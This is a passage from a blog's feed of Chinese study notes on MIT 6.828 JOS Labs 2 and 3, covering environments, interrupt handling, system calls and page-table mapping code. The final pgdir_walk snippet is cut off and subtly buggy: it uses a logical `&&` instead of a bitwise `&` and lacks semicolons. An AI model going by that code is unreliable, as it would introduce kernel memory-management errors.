      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】JOS学习笔记 Lab3</title>
    <link href="https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab3/"/>
    <id>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab3/</id>
    <published>2021-08-03T09:03:54.777Z</published>
    <updated>2021-08-06T16:50:34.459Z</updated>
    
    <content type="html"><![CDATA[<p>在这个实验中，将实现操作系统的一些基本功能，来实现用户环境中的进程的正常运行。你将会加强JOS内核的功能，为它增添一些重要的数据结构，用来记录用户进程环境的一些信息；创建一个单一的用户环境，并且加载一个程序运行它。你也可以让JOS内核能够完成用户环境所作出的任何系统调用，以及处理用户环境产生的各种异常。</p><h2 id="Part-A-User-Environments-and-Exception-Handling"><a href="#Part-A-User-Environments-and-Exception-Handling" class="headerlink" title="Part A: User Environments and Exception Handling"></a>Part A: User Environments and Exception Handling</h2><p>新包含的文件inc/env.h里面包含了JOS内核的有关用户环境(User Environment)的一些基本定义。用户环境指的就是一个应用程序运行在系统中所需要的一个上下文环境，操作系统内核使用数据结构 Env 来记录每一个用户环境的信息。在这个实验中，我们只会创建一个用户环境，但是之后我们会把它设计成能够支持多用户环境，即多个用户程序并发执行。</p><p>在 kern/env.c 文件中我们看到，操作系统一共维护了三个重要的和用户环境相关的全局变量：</p><ul><li>struct Env *envs = NULL;        // All environments</li><li>struct Env *curenv = NULL;        // The current env</li><li>static struct Env *env_free_list;    // Free environment list</li></ul><p>一旦JOS启动，envs指针便指向了一个表示所有环境的Env结构数组。在我们的设计中，JOS内核将支持同一时刻最多 NENV 个活跃的用户环境，尽管这个数字要比真实情况下任意给定时刻的活跃用户环境数要多很多。系统会为每一个活跃的用户环境在envs链表中维护一个 Env 结构体。JOS内核也把所有不活跃的Env结构体，用env_free_list链接起来。这种设计方式非常方便进行用户环境env的分配和回收。内核也会把 curenv 指针指向在任意时刻正在执行的用户环境的 Env 结构体。在内核启动时，并且还没有任何用户环境运行时，curenv的值为NULL。</p><h3 id="Environment-State"><a href="#Environment-State" class="headerlink" title="Environment State"></a>Environment State</h3><p>我们要看一下，Env结构体每一个字段的具体含义是什么，Env结构体定义在 inc/env.h 文件中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span><span class="comment">// Saved registers</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span><span class="comment">// Next free Env</span></span><br><span class="line"><span class="keyword">envid_t</span> env_id;<span class="comment">// Unique environment identifier</span></span><br><span class="line"><span class="keyword">envid_t</span> env_parent_id;<span class="comment">// env_id of this env&#x27;s parent</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">EnvType</span> <span class="title">env_type</span>;</span><span class="comment">// Indicates special system environments</span></span><br><span class="line"><span class="keyword">unsigned</span> env_status;<span class="comment">// Status of the environment</span></span><br><span class="line"><span class="keyword">uint32_t</span> env_runs;<span class="comment">// Number of times environment has run</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address space</span></span><br><span class="line"><span class="keyword">pde_t</span> *env_pgdir;<span class="comment">// Kernel virtual address of page dir</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>env_tf</strong>：这个类型的结构体在inc/trap.h文件中被定义，里面存放着当用户环境暂停运行时，所有重要寄存器的值。内核也会在系统从用户态切换到内核态时保存这些值，这样的话用户环境可以在之后被恢复，继续执行。</p><p><strong>env_link</strong>：这个指针指向在env_free_list中，该结构体的后一个free的Env结构体。当然前提是这个结构体还没有被分配给任意一个用户环境时，该域才有用。</p><p><strong>env_id</strong>：这个值可以唯一的确定使用这个结构体的用户环境是什么。当这个用户环境终止，内核会把这个结构体分配给另外一个不同的环境，这个新的环境会有不同的env_id值。</p><p><strong>env_parent_id</strong>：创建这个用户环境的父用户环境的env_id</p><p><strong>env_type</strong>：用于区别出来某个特定的用户环境。对于大多数环境来说，它的值都是 ENV_TYPE_USER.</p><p><strong>env_status</strong>：这个变量存放以下可能的值</p><p>　　　　ENV_FREE: 代表这个结构体是不活跃的，应该在链表env_free_list中。</p><p>　　　　ENV_RUNNABLE: 代表这个结构体对应的用户环境已经就绪，等待被分配处理机。</p><p>　　　　ENV_RUNNING: 代表这个结构体对应的用户环境正在运行。</p><p>　　　　ENV_NOT_RUNNABLE: 代表这个结构体所代表的是一个活跃的用户环境，但是它不能被调度运行，因为它在等待其他环境传递给它的消息。</p><p>　　　　ENV_DYING: 代表这个结构体对应的是一个僵尸环境。一个僵尸环境在下一次陷入内核时会被释放回收。</p><p><strong>env_pgdir</strong>：这个变量存放着这个环境的页目录的虚拟地址</p><p>就像Unix中的进程一样，一个JOS环境中结合了“线程”和“地址空间”的概念。线程通常是由被保存的寄存器的值来定义的，而地址空间则是由env_pgdir所指向的页目录表还有页表来定义的。为了运行一个用户环境，内核必须设置合适的寄存器的值以及合适的地址空间。</p><h3 id="Allocating-the-Environments-Array"><a href="#Allocating-the-Environments-Array" class="headerlink" title="Allocating the Environments Array"></a>Allocating the Environments Array</h3><p>在lab 2，你在mem_init() 函数中分配了pages数组的地址空间，用于记录内核中所有的页的信息。现在你需要进一步去修改mem_init()函数，来分配一个Env结构体数组，叫做envs。</p><p>由于exercise1比较少，所以放在这里一起了</p><p>Exercise 1. 修改一下mem_init()的代码，让它能够分配envs数组。这个数组是由NENV个Env结构体组成的。envs数组所在的这部分内存空间也应该是用户模式只读的。被映射到虚拟地址UENVS处。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">envs = (struct Env*)boot_alloc(NENV*<span class="keyword">sizeof</span>(struct Env));</span><br><span class="line"><span class="built_in">memset</span>(envs, <span class="number">0</span>, NENV * <span class="keyword">sizeof</span>(struct Env));</span><br></pre></td></tr></table></figure><p>分配完之后在页表中添加它的映射关系</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, UENVS, PTSIZE, PADDR(envs), PTE_U);</span><br></pre></td></tr></table></figure><p>之前完后内核线性地址空间到物理地址空间的映射图如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_1_lab3%EF%BF%BD%EF%BF%BD%CA%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D6%B7%EF%BF%BD%D5%BC%E4%B5%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D6%B7%EF%BF%BD%D5%BC%EF%BF%BD%D3%B3%EF%BF%BD%EF%BF%BD.png" alt="内存映射关系">)<img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_1_lab3%E5%BC%80%E5%A7%8B%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%B0%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E6%98%A0%E5%B0%84.png" alt="内存映射关系"></p><h3 id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h3><p>现在需要去编写kern/env.c文件来运行一个用户环境了。由于现在没有文件系统，所以我们设置内核来加载嵌入在内核中的静态二进制文件映像。</p><p>Lab3里面的GNUmakefile文件在obj/user/目录下面生成了一系列的二进制映像文件。如果你看一下kern/Makefrag文件，就会发现一些奇妙的地方，这些地方把二进制文件直接链接到内核可执行文件中，只要这些文件是.o文件。其中在链接器命令行中的-b binary 选项会使这些文件被当做二进制执行文件链接到内核之后。在 i386_init() 函数中，你会看到运行上述二进制文件的代码，但是我们需要完成能够设置这些代码的运行用户环境的功能。</p><p>用户环境的代码被调用前，操作系统一共俺顺序执行了以下函数：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start (kern/entry.S)</span><br><span class="line">i386_init (kern/init.c)</span><br><span class="line">cons_init</span><br><span class="line">mem_init</span><br><span class="line">env_init</span><br><span class="line">trap_init (still incomplete at this point)</span><br><span class="line">env_create</span><br><span class="line">env_run</span><br><span class="line">env_pop_tf</span><br></pre></td></tr></table></figure><p>一旦完成上述函数的代码，并且在QEMU下编译运行，系统会进去用户空间，并且开始执行hello程序，知道他做出一个系统调用指令int。但是这个系统调用指令不能成功运行，因为到目前为止，JOS还没设置相关硬件来实现从用户态到内核态的转换功能。当CPU发现，它没有被设置能够处理这种系统调用的中断时，它会触发一个保护异常，然后发现这个保护异常，然后发现这个保护异常也无法处理，从而又产生一个错误异常，然后又发现仍旧无法解决问题，所以最后放弃，我们把这个叫做”triple fault”。通常来说，接下来CPU会复位，系统会重启。</p><p>所以我们马上要来解决这个问题，不过解决之前我们可以使用调试器来检查一下程序要进入用户模式时做了什么。使用make qemu-gdb 并且在 env_pop_tf 处设置断点，这条指令应该是即将进入用户模式之前的最后一条指令。然后进行单步调试，处理会在执行完 iret 指令后进入用户模式。然后依旧可以看到进入用户态后执行的第一条指令了，该指令是一个cmp指令，开始于文件 lib/entry.S 中。 现在使用 b *0x… 设置一个断点在hello文件（obj/user/hello.asm）中的sys_cputs函数中的 int $0x30 指令处。这个int指令是一个系统调用，用来展示一个字符到控制台。如果你的程序运行不到这个int指令，说明有错误。至于在什么时候运行这个程序的，我们可以看到在i386_init中trap_init执行完后，ENV_CREATE(user_hello, ENV_TYPE_USER)，这个就会加载我们的ELF程序，然后就会执行我们的env_run。</p><h3 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h3><p>到目前为止，当程序运行到第一个系统调用int 0x30时，会进入错误的状态，因为现在系统调用无法从用户态切换到内核态。所以需要实现一个基本的异常/系统调用处理机制，使得内核可以从用户态转换为内核态。我们要先熟悉下x86的异常中断机制。</p><h3 id="Basics-of-Protected-Control-Transfer"><a href="#Basics-of-Protected-Control-Transfer" class="headerlink" title="Basics of Protected Control Transfer"></a>Basics of Protected Control Transfer</h3><p>异常和中断都是”受到保护的控制转移方法”，都会使处理器从用户态转移为内核态。在Intel的术语中，一个中断指的是由外部异步事件引起的处理器控制器转移，比如外部I/O设备发送来的中断信号。一个异常指的是由于当前正在运行的指令所带来的同步处理器控制权的转移，比如除零溢出异常。</p><p>为了能够确保这些控制的转移能够真正被保护起来，处理器的中断/异常机制通常被设计为：用户态的代码无权选择内核中的代码从哪里开始执行。处理器可以确保只有在某些条件下，才能进入内核态。在X86上，有两种机制配合工作来提供这种保护：</p><ol><li><p>中断向量表：</p><p>处理器保证中断和异常只能够引起内核进入到一些特定的，被事现定义好的程序入口点，而不是由触发中断的程序来觉得中断程序入口点</p><p>x86允许多达256个不同的中断和异常，每一个都配备一个独一无二的中断向量。一个向量指的就是0到255中的一个数。一个中断向量的值是根据中断源来决定的：不同设备，错误条件，以及对内核的请求都会产生不同的中断和中断向量的组合。CPU将使用这个向量作为这个中断在中断向量表中的索引，这个表是由内核设置的，放在内核空间中，和GDT很像。通过这个表中的任意一个表项，处理器可以知道：</p><ul><li>需要加载到EIP寄存器中的值，这个值指向了处理这个中断的中断处理程序的位置。</li><li>需要加载到CS寄存器中的值，里面还包含了这个中断处理程序的运行特权级(即这个程序是在用户态还是内核态运行)。</li></ul></li><li><p>任务状态段：</p><p>处理器还需要一个地方来存放，当异常/中断发生时，处理器的状态，比如EIP和CS寄存器的值。这样的话，中断处理程序一会可以重新返回到原来的程序中。这段内存自然也要保护起来，不能被用户态的程序所篡改。</p><p>正因为如此，当一个x86处理器要处理一个中断、异常并且使运行特权级从用户态转为内核态时，它也会把它的堆栈切换到内核空间中。一个叫做”任务状态段”的数据结构将会详细记录这个堆栈所在的段的断描述符和地址。处理器会把SS，ESP，EFLAGS，CS，EIP以及一个可选错误码等等这些值压入到这个堆栈上。然后加载中断处理程序的CS，EIP值，并且设置ESP，SS寄存器指向新的堆栈。</p><p>尽管TSS非常大，并且还有很多其他的功能，但是JOS仅仅使用它来定义处理器从用户态转向内核态所采用的内核堆栈，由于JOS中的内核指的就是特权级0，所以处理器用TSS中的ESP0，SS0字段来指明这个内核堆栈的位置，大小。</p></li></ol><h3 id="Types-of-Exceptions-and-Interrupts"><a href="#Types-of-Exceptions-and-Interrupts" class="headerlink" title="Types of Exceptions and Interrupts"></a>Types of Exceptions and Interrupts</h3><p>所有的由x86处理器内部产生的异常的向量值都是0到31之间的整数，因此映射到IDT条目0到31。例如，页错误所对应的向量值是14，而大于31号的中断向量对应的是软件中断，由int指令生成；或者由外部中断，由外部设备生成。</p><p>在这一章我们将拓展JOS的功能，使它能够处理0到31号内部异常。在下一章能够处理48号中断(0x30)中断，主要用来被用于系统调用。在Lab4中会继续扩展JOS使它能够处理外部硬件中断，比如时钟中断。</p><h3 id="An-Example"><a href="#An-Example" class="headerlink" title="An Example"></a>An Example</h3><p>让我们看一个例子，假设处理器正在用户状态下运行代码，但是遇到一个除法指令，并且除数为0。</p><ol><li><p>处理器会首先切换自己的堆栈，切换到TSS的SS0，ESP0字段所指定的内核堆栈区，这两个字段分别存放着GK_KD和KSTACKTOP的值。</p></li><li><p>处理器把异常参数压入到内核堆栈中，起始于地址KSTACKTOP：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13850890084/0" alt="image-20210805174531695"></p></li><li><p>因为我们要处理的是除零异常，它的中断向量是0，处理器会读取IDT表中的0号表项，并且把CS:EIP的值设置为0号中断处理函数的地址</p></li><li><p>中断处理函数开始执行，并且处理中断。</p><p>对于某些特定的异常，除了上面图中要保存的值之外，还要再压入一个值，叫做错误码。比如页表错误，就是其中一个实例。当压入错误码之后，内核的堆栈如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13850890540/0" alt="image-20210805174537673"></p></li></ol><p>以上几步都是硬件自动完成的。</p><h3 id="Nested-Exceptions-and-Interrupts"><a href="#Nested-Exceptions-and-Interrupts" class="headerlink" title="Nested Exceptions and Interrupts"></a>Nested Exceptions and Interrupts</h3><p>处理器在用户态和内核态下都可以处理异常或中断。只有当处理器从用户态切换到内核态时，才会自动地切换堆栈，并且把一些寄存器中的原来的值压入到堆栈上，并且触发相应的中断处理函数。但如果处理器已经由于正在处理中断而处于内核态下，此时CPU只会向堆栈压入更多的值。通过这种方式，内核就可以处理嵌套中断。</p><p>如果处理器已经在内核态下并且遇到嵌套中断，因为它不需要切换堆栈，所以它不需要存储SS，ESP寄存器的值。此时内核堆栈就像下面这个样子：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13850915540/0" alt="image-20210805175120776"></p><p>这里有一个重要的警告。如果处理器在内核态下接受一个异常，而且由于一些原因，比如堆栈空间不足，不能把当前的状态信息(寄存器的值)压入到内核堆栈中时，那么处理器是无法恢复到原来的状态了，它会自动重启。</p><h3 id="Setting-Up-the-IDT"><a href="#Setting-Up-the-IDT" class="headerlink" title="Setting Up the IDT"></a>Setting Up the IDT</h3><p>现在已经有了所有的基本信息去设置IDT表，并且在JOS处理异常。现在只需要处理内部异常(中断向量号0到31)。</p><p>在头文件inc/trap.h和kern/trap.h中包含了和中断异常相关的非常重要的定义。kern/trap.h文件中包含了仅内核可见的一些定义，inc/trap.h中包含了用户态也可见的一些定义。</p><p>最后我们要实现的代码的效果如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13851554882/0" alt="image-20210805205605979"></p><p>每一个中断或异常都有它自己的中断处理函数，分别定义在trapentry.S中，trap_init函数将初始化IDT表。每一个处理函数都应该构建一个结构体Trapframe在堆栈上，并且调用trap函数指向这个结构体，trap函数然后处理异常/中断，给它分配一个中断处理函数。</p><p>所以整个操作系统的中断控制流程为：</p><ol><li>trap_init()先将所有中断处理函数的起始地址放到中断向量表IDT中。</li><li>当中断发生时，不管是外部中断还是内部中断，处理器捕捉到该中断，进入内核态，根据中断向量去查询中断向量表，找到对应的表项。</li><li>保存被中断的程序的上下文到内核堆栈中，调用这个表项中指明的中断处理函数。</li><li>执行中断处理函数。</li><li>执行完成后，恢复被中断的进程的上下文，返回用户态，继续运行这个进程。</li></ol><p>缺页中断是一个非常重要的中断，因为我们在后续的实验中，非常依赖于能够处理缺页中断的能力。当缺页中断发生时，系统会把引起中断的线性地址存放到控制寄存器 CR2 中。在trap.c 中，已经提供了一个能够处理这种缺页异常的函数page_fault_handler()。</p><h3 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h3><p>断点异常，异常号为3，这个异常可以让调试器能够给程序加上断点。加断点的基本原理就是把要加断点的语句用一个 INT3 指令替换，执行到INT3时，会触发软中断。在JOS中，我们将通过把这个异常转换成一个伪系统调用，这样的话任何用户环境都可以使用这个伪系统调用来触发JOS kernel monitor。</p><h3 id="System-calls"><a href="#System-calls" class="headerlink" title="System calls"></a>System calls</h3><p>用户程序会要求内核帮助它完成系统调用。当用户程序触发系统调用，系统进入内核态。处理器和操作系统将保存该用户程序当前的上下文状态，然后由内核将执行正确的代码完成系统调用，然后回到用户程序继续执行。而用户程序到底是如何得到操作系统的注意，以及它如何说明它希望操作系统做什么事情的方法是有很多不同的实现方式的。</p><p>在JOS中，我们会采用int指令，这个指令会触发一个处理器的中断。特别的，我们用int $0x30来代表系统调用中断。注意，中断0x30不是通过硬件产生的。</p><p>应用程序会把系统调用号以及系统调用的参数放到寄存器中。通过这种方法，内核就不需要去查询用户程序的堆栈了。系统调用号存放到 %eax 中，参数则存放在 %edx, %ecx, %ebx, %edi, 和 %esi 中。内核会把返回值送到 %eax中。在lib/syscall.c中已经写好了触发一个系统调用的代码。</p><h3 id="User-mode-startup"><a href="#User-mode-startup" class="headerlink" title="User-mode startup"></a>User-mode startup</h3><p>用户程序真正开始运行的地方是在lib/entry.S文件中。该文件中，首先会进行一些设置，然后就会调用lib/libmain.c 文件中的 libmain() 函数。你首先要修改一下 libmain() 函数，使它能够初始化全局指针 thisenv ，让它指向当前用户环境的 Env 结构体。然后 libmain() 函数就会调用 umain，这个 umain 程序恰好是 user/hello.c 中被调用的函数。在之前的实验中我们发现，hello.c程序只会打印 “hello, world” 这句话，然后就会报出 page fault 异常，原因就是 thisenv-&gt;env_id 这条语句。现在你已经正确初始化了这个 thisenv的值，再次运行就应该不会报错了</p><p>这里经过调试，在下面这个图的指令上就会触发page fault异常，因为我们的eax为0，就是thisenv还未初始化，所以此时就会触发异常</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855120758/0" alt="image-20210806215640906"></p><p>然后就会进入到下面，接着调用page fault处理函数</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855126242/0" alt="image-20210806215844590"></p><p>由于exeircise8较少，我们就写在这里，其实就是初始化thisenv指针。</p><p>通过env.h中的注释，我们知道只要知道env_id的0到9，就能知道这个环境在envs数组中的索引，就能得到Env结构体了。</p><p>所以我们修改我们lib/libmain.c下的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">libmain(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// set thisenv to point at our Env structure in envs[].</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">envid_t</span> envid = sys_getenvid();</span><br><span class="line">thisenv = envs + envid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// save the name of the program so that panic() can use it</span></span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">0</span>)</span><br><span class="line">binaryname = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// call user main routine</span></span><br><span class="line">umain(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exit gracefully</span></span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一切顺利就会打印处下面的两句</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855169365/0" alt="image-20210806221455126"></p><h3 id="Page-faults-and-memory-protection"><a href="#Page-faults-and-memory-protection" class="headerlink" title="Page faults and memory protection"></a>Page faults and memory protection</h3><p>内存保护是操作系统的非常重要的一项功能，它可以防止由于用户程序崩溃对操作系统带来的破坏与影响。</p><p>操作系统通常依赖于硬件的支持实现内存保护。操作系统可以让硬件能够始终知晓哪些虚拟地址是有效的，哪些是无效的。当程序尝试访问一个无效地址，或者尝试去访问一个超出它访问权限的地址时，处理器会在这个指令处终止，并且触发异常，陷入内核态，与此同时把错误的信息报告给内核。如果这个错误是可以被修复的，那么内核会修复这个异常，然后程序继续运行。如果异常无法修复，则程序永远不会继续运行。</p><p>作为一个可修复的例子，让我们考虑一下可自动拓展的堆栈。在许多系统中，内核在初始化情况下只会分配一个内核堆栈页，如果程序想要访问这个内核堆栈页之外的堆栈空间的话，就会触发异常，此时内核会自动再分配一些页给这个程序，程序就可以继续运行了。</p><p>系统调用也为内存保护带来了问题。大部分系统调用接口让用户程序传递一个指针参数给内核。这些指针指向的是用户缓冲区。通过这种方式，系统调用在执行时就可以解引用这些指针。但是这里有两个问题：</p><ol><li><p>在内核中的page fault要比在用户程序中的page fault更严重。如果内核在操作自己的数据结构时出现 page faults，这是一个内核的bug，而且异常处理程序会中断整个内核。但是当内核在解引用由用户程序传递来的指针时，它需要一种方法去记录此时出现的任何page faults都是由用户程序带来的。</p></li><li><p>内核通常比用户程序有着更高的内存访问权限。用户程序很有可能要传递一个指针给系统调用，这个指针指向的内存区域是内核可以进行读写的，但是用户程序不能。此时内核必须小心不要去解析这个指针，否则的话内核的重要信息很有可能被泄露。</p><p>现在我们需要通过仔细检查所有由用户传递来指针所指向的空间来解决上述两个问题。当一个程序传递给内核一个指针时，内核会检查这个地址是在整个地址空间的用户地址空间部分，而且页表也运行进行内存的操作。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本实验大致做了三件事：</p><ol><li><p>进程建立，可以加载用户ELF文件并执行：</p><ol><li><p>内核维护一个名为envs的Env数组，每个Env结构对应一个进程，Env结构最重要的字段有Trapframe env_tf（该字段中断发生时可以保存寄存器的状态），pde_t *env_pgdir（该进程的页目录地址）。进程对应的内核数据结构可以用下图总结：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_3_%E6%80%BB%E7%BB%93_%E8%BF%9B%E7%A8%8B%E6%8A%BD%E8%B1%A1.png" alt="JOS进程数据结构"></p></li><li><p>定义了env_init函数，env_create等函数，初始化Env结构，将Env结构Trapframe env_tf中的寄存器值设置到寄存器中，从而达到执行该Env的效果</p></li></ol></li><li><p>创建异常处理函数，建立并加载IDT，使JOS能支持中断处理。要能说出中断发生时的详细步骤。需要搞清楚内核态和用户态转换方式：通过中断机制可以从用户环境进入内核态。使用iret指令从内核态回到用户环境。中断发生过程以及中断返回过程和系统调用原理可以总结为下图：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_4_%E6%80%BB%E7%BB%93_%E4%B8%AD%E6%96%AD%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8.png" alt="JOS中断过程，系统调用原理"></p></li><li><p>利用中断机制，使JOS支持系统调用。遇到int 0x30这条系统调用指令时发生的详细步骤参考上图。</p></li></ol><p>lab3完~</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855481716/0" alt="image-20210807005029900"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在这个实验中，将实现操作系统的一些基本功能，来实现用户环境中的进程的正常运行。你将会加强JOS内核的功能，为它增添一些重要的数据结构，用来记录用户进程环境的一些信息；创建一个单一的用户环境，并且加载一个程序运行它。你也可以让JOS内核能够完成用户环境所作出的任何系统调用，以
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise5</title>
    <link href="https://billyotry.github.io/2021/08/02/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise5/"/>
    <id>https://billyotry.github.io/2021/08/02/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise5/</id>
    <published>2021-08-02T13:14:38.032Z</published>
    <updated>2021-08-02T13:20:47.121Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>继续完善mem_init()函数，你的程序现在必须能够通过check_kern_pgdir()和check_page_installed_pgdir()函数的检测。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>剩下的工作就是完善mem_init函数，现在要完善的功能就是把关于操作系统的一些重要的地址映射到现在的新的页目录项上。可以利用之前的boot_map_region函数。</p><p>首先我们要映射的范围是把pages数组映射到线性地址UPAGES，大小为一个PTSIZE。</p><p>所以我们添加的代码为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, UPAGES, PTSIZE, PADDR(pages), PTE_U);</span><br></pre></td></tr></table></figure><p>其中perm变量之所以设置为PTE_U，是因为这部分空间是kernel space和user space中的代码都能访问的，所以要设置PTE_U。</p><p>然后映射内核的堆栈区域，把由bootstack变量所标记的物理地址范围映射给内核的堆栈。内核堆栈的虚拟地址范围是[KSTACKTOP-PTSIZE, KSTACKTOP)，不过要把这个范围划分成两部分：</p><ul><li>[KSTACKTOP-KSTKSIZE, KSTACKTOP) 这部分映射关系加入的页表中。</li><li>[KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) 这部分不进行映射。</li></ul><p>对这部分地址的访问权限是，kernel space 可以读写，user space 无权访问，所以代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir,KSTACKTOP-KSTKSIZE,KSTKSIZE,PADDR(bootstack),PTE_W);</span><br></pre></td></tr></table></figure><p>最后映射整个操作系统内核，虚拟地址范围是[KERNBASE, 2^32]，物理地址范围是[0，2^32 - KERNBASE]。</p><p>访问权限是，kernel space 可以读写，user space 无权访问，所以代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, KERNBASE, <span class="number">0xffffffff</span> - KERNBASE, <span class="number">0</span>, PTE_W);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;继续完善mem_init()函数，你的程序现在必须能够通过check_kern_pgdir()和check_page_installed_p
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise4</title>
    <link href="https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise4/"/>
    <id>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise4/</id>
    <published>2021-08-01T08:59:45.661Z</published>
    <updated>2021-08-02T08:35:33.584Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在kern/pmap.c中必须实现pgdir_walk()  boot_map_region()  page_lookup()  page_remove()  page_insert()函数。</p><p>mem_init中的check_page函数会检查我们的页表管理程序。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>pgdir_walk其实在注释中就说的很清楚了,通过线性地址va来返回对应页表项的地址，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pte_t</span> *</span><br><span class="line">pgdir_walk(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">int</span> create)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">uint32_t</span> pdx = PDX(va);<span class="comment">//(va&gt;&gt;22)&amp;&amp;0x3ff高10位页目录项索引</span></span><br><span class="line"><span class="keyword">uint32_t</span> ptx = PTX(va);<span class="comment">//(va&gt;&gt;12)&amp;&amp;0x3ff中间10位页表项索引</span></span><br><span class="line"><span class="keyword">pte_t</span> *pde;<span class="comment">//页目录项指针</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte;<span class="comment">//页表项指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line">pde = &amp;pgdir[pdx] <span class="comment">//页目录项的地址</span></span><br><span class="line"><span class="keyword">if</span>(*pde &amp;&amp; PTE_P)&#123; </span><br><span class="line"><span class="comment">//二级页表存在</span></span><br><span class="line"><span class="comment">//PTE_ADDR得到物理地址，然后转化位虚拟地址，得到页表的虚拟地址</span></span><br><span class="line">pte = (KADDR(PTE_ADDR(*pde)))</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span 